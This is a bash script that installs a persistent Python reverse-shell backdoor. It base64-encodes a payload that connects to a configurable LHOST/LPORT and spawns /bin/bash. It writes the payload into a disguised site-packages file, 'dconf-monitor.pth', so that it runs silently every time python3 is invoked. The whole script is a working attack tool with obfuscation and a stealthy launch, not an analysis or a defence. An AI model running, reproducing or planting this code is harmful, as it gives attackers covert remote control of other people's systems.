#!usr/bin/env bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/obfuscate.sh"

LHOST="${LHOST:-}"
LPORT="${LPORT:-4444}"

PTH_NAME="dconf-monitor.pth"

info()    { echo "[*] $*"; }
success() { echo "[+] $*"; }
warn()    { echo "[!] $*"; }
error()   { echo "[-] $*" >&2; }

# -- Preflight checks --
if [[ "$(id -u)" -ne 0 ]]; then
    error "This script must be run as root"
    exit 1
fi

if [[ -z "$LHOST" ]]; then
    error "LHOST is not set. Export it before running:"
    error "  export LHOST=192.168.1.10"
    exit 1
fi

if ! command -v python3 &>/dev/null; then
    error "python3 is not installed on this system"
    exit 1
fi


# -- Find site-packages directory --
SITE_PACKAGES=$(python3 -c "import site; print(site.getsitepackages()[0])")

if [[ -z "$SITE_PACKAGES" || ! -d "$SITE_PACKAGES" ]]; then
    error "Could not determine Python site-packages directory"
    exit 1
fi

info "Found site-packages: ${SITE_PACKAGES}"

PTH_FILE="${SITE_PACKAGES}/${PTH_NAME}"


# -- Check if .pth file already exists --
if [[ -f "$PTH_FILE" ]]; then
    warn ".pth file already exists at ${PTH_FILE} — skipping"
    exit 0
fi

# -- Build Payload --
RAW_PYTHON="import socket,os,pty;s=socket.socket();s.connect((\"${LHOST}\",${LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")"
B64_PAYLOAD=$(echo -n "$RAW_PYTHON" | base64 | tr -d '\n')

PTH_LINE="import base64,subprocess,sys; exec(compile(base64.b64decode('${B64_PAYLOAD}'),'<string>','exec')) if False else subprocess.Popen([sys.executable,'-c',__import__('base64').b64decode('${B64_PAYLOAD}').decode()],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)"

# -- Install .pth file --
info "Installing .pth file..."

echo "$PTH_LINE" > "$PTH_FILE"

success ".pth file installed: ${PTH_FILE}"
info "Fires every time python3 is invoked on this system"
info "Remove with: rm ${PTH_FILE}"